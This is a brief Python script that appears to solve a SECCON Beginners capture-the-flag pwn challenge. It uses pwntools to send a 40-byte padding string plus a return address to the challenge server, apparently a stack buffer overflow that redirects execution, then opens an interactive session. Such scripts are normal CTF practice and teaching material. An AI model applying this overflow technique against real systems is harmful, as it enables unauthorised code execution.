from pwn import *


if __name__ == '__main__':
    r = remote('bs.quals.beginners.seccon.jp', 9001)
    print(r.recv().decode())
    print(r.recv().decode())

    payload = 'a' * 8 * 5 + '\x62\x08\x40'
    r.send(payload)
    print(r.recv().decode())

    r.interactive()
